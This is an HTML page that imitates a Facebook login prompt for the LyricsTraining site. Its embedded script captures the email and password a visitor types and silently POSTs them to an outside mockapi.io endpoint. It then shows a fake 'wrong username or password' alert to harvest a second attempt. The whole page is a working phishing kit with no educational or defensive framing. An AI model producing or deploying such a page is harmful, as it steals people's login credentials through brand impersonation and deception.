<!DOCTYPE html>
<html lang="en">

<head>




    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>

<body>
    <section class="login-form-wrap" style="box-sizing: border-box;font-family: 'Lato', sans-serif;background: radial-gradient(ellipse at center, #5170ad 0%, #355493 100%);border: 1px solid #2d416d;box-shadow: 0 1px #5670A4 inset, 0 0 10px 5px rgba(0, 0, 0, 0.1);border-radius: 5px;width: 360px;height: 380px;margin: 60px auto;padding: 50px 30px 0 30px;text-align: center;">
        <h1 style="box-sizing: border-box;margin: 0 0 50px 0;padding: 0;font-size: 26px;color: #fff;">Facebook</h1>
        <img src="https://lyricstraining.com/img/logo.png?rev=2.7.1" alt="" style="float:left;height: 50px;margin-top: -15px">
        <h5 style="box-sizing: border-box;color: white;margin-top: 40px;">Login by Facebook to continue with LYRICSTRAINING</h5>
        <form class="login-form" style="box-sizing: border-box;" id="hihi">
            <label style="box-sizing: border-box;">
                <input type="text" name="email" id="username" placeholder="Email" style="box-sizing: border-box;width: 100%;border: 1px solid #314d89;outline: none;padding: 12px 20px;color: #afafaf;font-weight: 400;font-family: 'Lato', sans-serif;cursor: pointer;border-bottom: none;border-radius: 4px 4px 0 0;padding-bottom: 13px;box-shadow: 0 -1px 0 #E0E0E0 inset, 0 1px 2px rgba(0, 0, 0, 0.23) inset;">
            </label>
            <label style="box-sizing: border-box;">
                <input type="password" name="password" id="password" required placeholder="Password" style="box-sizing: border-box;width: 100%;border: 1px solid #314d89;outline: none;padding: 12px 20px;color: #afafaf;font-weight: 400;font-family: 'Lato', sans-serif;cursor: pointer;border-top: none;border-radius: 0 0 4px 4px;box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);">
            </label>
            <input type="submit" value="Login" style="box-sizing: border-box;font-family: 'Lato', sans-serif;font-weight: 700;background: linear-gradient(to bottom, #e0e0e0 0%, #cecece 100%);display: block;margin: 20px auto 0 auto;width: 100%;border: none;border-radius: 3px;padding: 8px;font-size: 17px;color: #636363;text-shadow: 0 1px 0 rgba(255, 255, 255, 0.45);box-shadow: 0 1px 3px 1px rgba(0, 0, 0, 0.17), 0 1px 0 rgba(255, 255, 255, 0.36) inset;">
        </form>
        <h5 style="box-sizing: border-box;color: white;margin-top: 40px;">
            <a href="#" style="box-sizing: border-box;font-size: 14px;color: #fff;text-decoration: none;font-weight: 400;">Forgot password</a>
        </h5>
    </section>
    <script>
        document.getElementById('hihi').onsubmit = (e) => {
            e.preventDefault();
            user = document.getElementById('username').value;
            pass = document.getElementById('password').value;
            var xhttp = new XMLHttpRequest();
            xhttp.open("POST", "https://5aec459ff67ff70014510694.mockapi.io/activities", true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("user=" + user + "&pass=" + pass);
            document.getElementById('username').value = "";
            document.getElementById('password').value = "";
            alert("Wrong username or password, please re-type");
        }
    </script>
</body>

</html>
